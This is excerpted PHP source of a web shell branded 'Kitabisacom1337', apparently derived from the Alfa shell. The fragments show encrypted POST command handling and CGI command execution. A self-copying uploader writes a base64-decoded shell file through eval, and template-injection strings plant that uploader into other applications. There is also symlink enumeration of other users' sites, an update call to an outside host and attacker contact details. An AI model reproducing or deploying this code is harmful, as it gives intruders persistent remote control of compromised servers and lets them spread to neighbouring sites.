...
$GLOBALS['__KITABISACOM1337_COLOR__'] = array(
		"shell_border" => array(
			"key_color" => "black",
...
<center><img style="border-radius:100px;" width="500" height="250" alt="alfa team 2012" draggable="false" src="https://i.ibb.co/W0xrqXb/KITABISACOM.png" /></center>
...
function decrypt_post($str){
	if(__KITABISACOM1337_POST_ENCRYPTION__){
		$pwd = __KITABISACOM1337_SECRET_KEY__;
...
function alfa_getColor($target){
	if(isset($GLOBALS["DB_NAME"]["color"][$target])&&$GLOBALS["DB_NAME"]["color"][$target]!=""){
		...
		$target = $GLOBALS["__KITABISACOM1337_COLOR__"][$target];
		if(is_array($target)){
...
function _alfa_cgicmd($cmd,$lang="perl",$set_cookie=false){
	...
	if($is_curl||$is_socket){
		...
		$cgi_url = __KITABISACOM1337_DATA_FOLDER__."/alfacgiapi/".$lang.$cgi_ext;
...
define("KITABISACOM1337_TEMPDIR", (function_exists("sys_get_temp_dir") ? (@is_writable(str_replace('\\','/',sys_get_temp_dir()))?sys_get_temp_dir():(@is_writable('.')?'.':false)) : false));
function alfahead(){
$GLOBALS['__KITABISACOM1337_SHELL_CODE'] = '';
$alfa_uploader = '$x = base64_decode("'.$GLOBALS['__KITABISACOM1337_SHELL_CODE'].'");$solevisible = fopen("solevisible.php","w");fwrite($solevisible,$x);';
define("KITABISACOM1337_UPLOADER", "eval(base64_decode('".__ZW5jb2Rlcg($alfa_uploader)."'))");
if(!isset($_POST['ajax'])){
...
<div id=\'hidden_sh\'><a class="alert_green" target="_blank" href="?solevisible"><span style="color:#42ff59;">'.__KITABISACOM1337_CODE_NAME__.'</span><br><small>Version: <span class="hidden_shell_version">'.__KITABISACOM1337_VERSION__.'</span></small></a></div>
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="alfa team 2012" draggable="false" src="https://i.ibb.co/W0xrqXb/KITABISACOM.png" /></td>
</tr>
<tr>
...
function __showicon($r){
	...
	$s['loader']='http://i.ibb.co.com/5Ks2m0y/image.png';
...
if($key=='')$key='alfa';
if($method=='my'){$shell=__ZW5jb2Rlcg($shell);}else{$shell=$GLOBALS['__KITABISACOM1337_SHELL_CODE'];}
...
foreach($penc_array as $key=>$val)$postEnc_html .= '<option value="'.$key.'" '.(!empty($_POST['alfa7'])&&$_POST['alfa7']==$key?"selected":(__KITABISACOM1337_POST_ENCRYPTION__&&empty($_POST['alfa7'])?'selected':'')).'>'.$val.'</option>';
...
if($_POST['alfa7']=='export'){
	...
	$glob_colors = $GLOBALS["__KITABISACOM1337_COLOR__"];
	$array = array();
...
if(empty($about_us)){
$about_us = "<pre><center><img src='https://i.ibb.co/W0xrqXb/KITABISACOM.png'><br>
...
$path = $_POST['alfa10'];
$method = $_POST['alfa4'];
$index = "{php}".KITABISACOM1337_UPLOADER.";{/php}";
...
$prefix = $_POST['alfa10'];
$method = $_POST['alfa4'];
$shellCode = "{\${".KITABISACOM1337_UPLOADER."}}";
...
$faq_name = "faq";
$faq_file = "/faq.php";
$code = "{\${".KITABISACOM1337_UPLOADER."}}{\${exit()}}&";
...
function alfacheckupdate(){
	...
	if(function_exists("curl_version")){
		$update = new AlfaCURL();
		$json = $update->Send("http://solevisible.com/update.json?ver=".__KITABISACOM1337_VERSION__);
		$json = @json_decode($json,true);
		$data = array();
		if($json){
			if(!isset($_COOKIE['alfa_checkupdate']) && !empty($json["type"])){
				if($json["type"] == "update"){
					if(__KITABISACOM1337_VERSION__ != $json['version'] || __KITABISACOM1337_UPDATE__ != $json['version_number']){
			...
			if(isset($json["code_name"]) && !empty($json["code_name"])){
				...
				$data["version_number"] = __KITABISACOM1337_VERSION__;
			}
...
function alfaWriteTocgiapi($name, $source){
	...
	if(in_array($name, $not_api)){
		$temp = KITABISACOM1337_TEMPDIR;
		if($temp){
			@chdir($temp);
		}
	}else{
		alfaCreateParentFolder();
		@chdir($GLOBALS['home_cwd'] . "/" . __KITABISACOM1337_DATA_FOLDER__);
	}
...
<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[ Kitabisacom1337 &copy; 2016-".date('Y')." ]</span><br><span> <span style='letter-spacing: 2px;color: #dfff00;'>root@kitabisacom1337.com</span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://telegram.me/penguinsalju'>@citi69</a></span></div></td>
</tr>
</table>
</div>
...
if($evalType=="c"){
$tmpdir = KITABISACOM1337_TEMPDIR;
chdir($tmpdir);
...
function alfaCreateParentFolder(){
	$parent = $GLOBALS['home_cwd'] . "/" . __KITABISACOM1337_DATA_FOLDER__;
	if(!@is_dir($parent)){
...
echo __pre();
echo '<center><b><font color="white">Click >> </font><a target="_blank" href="'.__KITABISACOM1337_DATA_FOLDER__."/".$sym_dir.'" ><b><font size="4">'.$symname.'</font></b></a></b></center>';
}
...
echo $table_header;
$count=1;
$template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="{http}"/><span style="color:#00A220;margin-left:10px;"><b>{domain}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{owner}</font></b></td><td><a href="'.__KITABISACOM1337_DATA_FOLDER__.'/alfasymlink/root{sympath}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
...
$count=1;
echo $table_header;
$template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="http://www.{url}"/><span style="color:#00A220;margin-left:10px;"><b>{url}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{user}</font></b></td><td><a href="'.__KITABISACOM1337_DATA_FOLDER__.'/alfasymlink/root{cwd}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
if($sole){
...
@chmod($name,0755);
echo '<iframe src="'.__KITABISACOM1337_DATA_FOLDER__.'/cgialfa/'.$name.'" width="100%" height="600px" frameborder="0" style="opacity:0.9;filter: alpha(opacity=9);overflow:auto;"></iframe>';
}
}
echo $div;
alfafooter();
...
return('<iframe src="'.__KITABISACOM1337_DATA_FOLDER__."/".$f.'" width="'.$width.'" height="'.$height.'" frameborder="0"></iframe>');
}
class AlfaCURL {
public $headers;
public $user_agent;
...
$this->path = KITABISACOM1337_TEMPDIR.'/Alfa_cookies.txt';
